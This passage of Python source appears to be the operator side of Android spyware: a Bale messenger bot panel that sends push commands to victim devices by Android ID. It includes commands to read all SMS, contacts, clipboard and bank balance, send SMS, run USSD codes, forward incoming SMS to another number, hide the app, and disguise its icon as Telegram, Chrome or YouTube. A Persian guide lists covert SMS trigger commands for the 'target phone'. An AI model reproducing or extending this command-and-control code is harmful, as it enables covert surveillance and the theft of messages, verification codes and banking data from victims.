            self.edit_message_text(
                chat_id, message_id,
                "<b>\U0001f310 Set WebView URL</b>\n\nSend the URL:",
                reply_markup=make_back_keyboard()
            )
            self.set_state(user_id, "waiting_for_url", message_id=message_id)

        # --- Online List ---
        elif data.startswith("ol_"):
            try:
                rest = data[3:]
                page = int(rest[2:]) if rest.startswith("r_") else int(rest)
            except (ValueError, IndexError):
                page = 0
            text, kb = make_online_list_keyboard(page)
            self.edit_message_text(chat_id, message_id, text, reply_markup=kb)
            if data.startswith("ol_r_"):
                self.answer_callback_query(callback_id, "\U0001f504 Refreshed!", show_alert=False)

        # --- Open Device Panel ---
        elif data.startswith("open_"):
            aid = data[5:]
            if aid:
                self.edit_message_text(
                    chat_id, message_id,
                    make_device_panel_text(aid),
                    reply_markup=make_device_keyboard(aid)
                )

        # --- Device Actions ---
        elif data.startswith("d_"):
            rest = data[2:]
            parts = rest.split("_", 1)
            if len(parts) != 2 or not parts[1]:
                self.answer_callback_query(callback_id)
                return
            action, aid = parts

            action_map = {
                "ping": ("pingone", "\U0001f4e1 Ping sent!"),
                "hide": ("hideone", "\U0001f641 Hide sent!"),
                "unhide": ("unhideone", "\U0001f441 UnHide sent!"),
                "lastsms": ("lastsms", "\U0001f4ac Last SMS request sent!"),
                "allsms": ("allsms", "\U0001f4e8 All SMS request sent!"),
                "contacts": ("allcontact", "\U0001f4d0 All Contact request sent!"),
                "clip": ("clipboard", "\U0001f4cb Clipboard request sent!"),
                "vib": ("vibrateone", "\U0001f503 Vibrate sent!"),
                "norm": ("normalone", "\U0001f50a Normal sent!"),
                "info": ("fullinfo", "\u2139\ufe0f FullInfo request sent!"),
                "bank": ("bankbalance", "\U0001f3e6 Bank Balance request sent!"),
            }

            if action == "sendsms":
                self.edit_message_text(
                    chat_id, message_id,
                    "<b>\U0001f4de Send SMS</b>\n\nSend SMS text:",
                    reply_markup=make_back_keyboard()
                )
                self.set_state(user_id, "waiting_for_sms_text", {"androidid": aid}, message_id=message_id)

            elif action == "search":
                self.edit_message_text(
                    chat_id, message_id,
                    "<b>\U0001f50d SMS Search</b>\n\nSend search keyword (number or text):",
                    reply_markup=make_back_keyboard()
                )
                self.set_state(user_id, "waiting_for_search_query", {"androidid": aid}, message_id=message_id)

            elif action == "fwdon":
                self.edit_message_text(
                    chat_id, message_id,
                    "<b>\U0001f4e1 SMS Forward</b>\n\nSend the phone number to forward SMS to:",
                    reply_markup=make_back_keyboard()
                )
                self.set_state(user_id, "waiting_for_fwd_number", {"androidid": aid}, message_id=message_id)

            elif action == "fwdoff":
                sendPush({"action": "forward_off", "androidid": aid})
                self.edit_message_text(
                    chat_id, message_id,
                    f"<b>\U0001f4e1 Forward Disabled!</b>\n\nDevice: <code>{aid}</code>\n\n\u23f3 Waiting for confirmation...",
                    reply_markup=make_device_keyboard(aid)
                )

            elif action == "ussd":
                self.edit_message_text(
                    chat_id, message_id,
                    "<b>\u260e\ufe0f USSD Code</b>\n\nSend the USSD code (e.g. *140*1#):",
                    reply_markup=make_back_keyboard()
                )
                self.set_state(user_id, "waiting_for_ussd_code", {"androidid": aid}, message_id=message_id)

            elif action in ("icontg", "iconch", "iconyt", "icondef"):
                icon_map = {
                    "icontg": "telegram",
                    "iconch": "chrome",
                    "iconyt": "youtube",
                    "icondef": "default",
                }
                icon_name = icon_map.get(action, "default")
                sendPush({"action": "changeicon", "androidid": aid, "icon": icon_name})
                self.answer_callback_query(callback_id, f"\U0001f5bc Icon → {icon_name} sent!", show_alert=True)

            elif action in action_map:
                real_action, alert_text = action_map[action]
                sendPush({"action": real_action, "androidid": aid})
                self.answer_callback_query(callback_id, alert_text, show_alert=True)
            else:
                self.answer_callback_query(callback_id)

        elif data == "noop":
            self.answer_callback_query(callback_id)

    # ---------- Static Text Helpers ----------

    def _send_offline_guide(self, chat_id):
        text = (
            "<b>\U0001f4e1 \u0631\u0627\u0647\u0646\u0645\u0627\u06cc \u062f\u0633\u062a\u0648\u0631\u0627\u062a \u067e\u06cc\u0627\u0645\u06a9\u06cc</b>\n"
            "\n"
            "<b>\u0627\u06cc\u0646 \u062f\u0633\u062a\u0648\u0631\u0627\u062a \u0631\u0648 via SMS \u0628\u0647 \u0634\u0645\u0627\u0631\u0647 \u06af\u0648\u0634\u06cc \u0647\u062f\u0641 \u0627\u0631\u0633\u0627\u0644 \u06a9\u0646\u06cc\u062f:</b>\n"
            "\n"
            "<b>1. \U0001f4e4 \u0641\u0639\u0627\u0644\u200c\u0633\u0627\u0632\u06cc \u0641\u0648\u0631\u0648\u0627\u0631\u062f \u0627\u0633\u200c\u0627\u0645\u200c\u0627\u0633</b>\n"
            "<code>dwsybu offline 09120000000</code>\n"
            "\u2192 \u062a\u0645\u0627\u0645 SMS \u0647\u0627\u06cc \u062f\u0631\u06cc\u0627\u0641\u062a\u06cc \u0628\u0647 09120000000 \u0641\u0648\u0631\u0648\u0627\u0631\u062f \u0645\u06cc\u0634\u0647\n"
            "\u2192 \u06af\u0648\u0634\u06cc \u062c\u0648\u0627\u0628 \u0645\u06cc\u062f\u0647: <i>OfflineMode is On and set in this number : 09120000000</i>\n"
            "\n"
            "<b>2. \U0001f6d1 \u063a\u06cc\u0631\u0641\u0639\u0627\u0644\u200c\u0633\u0627\u0632\u06cc \u0641\u0648\u0631\u0648\u0627\u0631\u062f</b>\n"
            "<code>dwsybu off</code>\n"
            "\u2192 \u0641\u0648\u0631\u0648\u0627\u0631\u062f SMS \u0645\u062a\u0648\u0642\u0641 \u0645\u06cc\u0634\u0647\n"
            "\u2192 \u06af\u0648\u0634\u06cc \u062c\u0648\u0627\u0628 \u0645\u06cc\u062f\u0647: <i>OfflineMode is Off</i>\n"
            "\n"
            "<b>3. \u260e\ufe0f \u0627\u062c\u0631\u0627\u06cc \u06a9\u062f USSD</b>\n"
            "<code>dwsybu ussd *140*1#</code>\n"
            "\u2192 \u06a9\u062f USSD \u0631\u0648 \u0631\u0648\u06cc \u06af\u0648\u0634\u06cc \u0627\u062c\u0631\u0627 \u0645\u06cc\u06a9\u0646\u0647\n"
            "\u2192 \u06af\u0648\u0634\u06cc \u062c\u0648\u0627\u0628 \u0628\u0627 \u0646\u062a\u06cc\u062c\u0647 USSD \u0631\u0648 \u0645\u06cc\u062f\u0647\n"
            "\n"
            "<b>\u0646\u06a9\u0627\u062a:</b>\n"
            "\u2022 \u0645\u06cc\u062a\u0648\u0646\u06cc\u062f \u0627\u06cc\u0646\u0647\u0627 \u0631\u0648 \u0647\u0645\u0686\u0646\u06cc\u0646 \u0627\u0632 \u062f\u06a9\u0645\u0647\u200c\u0647\u0627\u06cc \u067e\u0646\u0644 \u062f\u0633\u062a \u0627\u0633\u062a\u06cc \u06a9\u0646\u06cc\u062f\n"
            "\u2022 \u062d\u0627\u0644\u062a \u0641\u0648\u0631\u0648\u0627\u0631\u062f \u0628\u0639\u062f \u0627\u0632 \u0631\u06cc\u0633\u062a\u0627\u0631\u062a \u06af\u0648\u0634\u06cc \u0647\u0645 \u0641\u0639\u0627\u0644 \u0645\u06cc\u0645\u0648\u0646\u0647\n"
            "\u2022 USSD \u0631\u0648\u06cc Android 8+ \u0628\u0647 \u0628\u0627\u0644\u0627 \u06a9\u0627\u0631 \u0645\u06cc\u06a9\u0646\u0647 (\u0641\u0648\u0644\u0628\u06a9 \u0631\u0648\u06cc \u0642\u062f\u06cc\u0645\u06cc)"
        )
        self.send_message(chat_id, text)

    def _send_commands_list(self, chat_id):
        text = (
            "<b>\U0001f4cb All Commands</b>\n"
            "\n"
            "<b>User Commands:</b>\n"
            "<code>/start</code> \u2192 Main menu\n"
            "<code>/set_ANDROID_ID</code> \u2192 Open device panel\n"
            "<code>/offline</code> \u2192 SMS commands guide\n"
            "\n"
            "<b>SMS Commands (send to phone):</b>\n"
            "<code>dwsybu offline NUMBER</code> \u2192 Forward SMS ON\n"
            "<code>dwsybu off</code> \u2192 Forward SMS OFF\n"
            "<code>dwsybu ussd *CODE#</code> \u2192 Execute USSD"
        )
        self.send_message(chat_id, text)


# ============================================================
#  BACKGROUND TASKS
# ============================================================
def cleanup_loop():
    while True:
        time.sleep(60)
        try:
            db_set_offline_stale()
            db_cleanup_old_pending()
        except Exception:
            pass


# ============================================================
#  START
# ============================================================
if __name__ == "__main__":
    init_db()
    saved_url = db_get_setting("webview_url")
    if saved_url:
        info.url = saved_url

    bot = BaleBot(info.token)

    # Start Flask API in background thread
    threading.Thread(
        target=lambda: api.run(host="0.0.0.0", port=info.port, threaded=True),
        daemon=True
    ).start()

    # Start WebSocket server in background thread
    threading.Thread(target=_ws_thread, daemon=True).start()

    # Start cleanup loop in background thread
    threading.Thread(target=cleanup_loop, daemon=True).start()

    print(f"[+] Panel started on port {info.port}", flush=True)
    print(f"[+] WebSocket server on port 5000", flush=True)
    print(f"[+] Bale bot admin ID: {info.admin}", flush=True)

    # Run Bale bot polling in main thread (blocking)
    bot.poll()
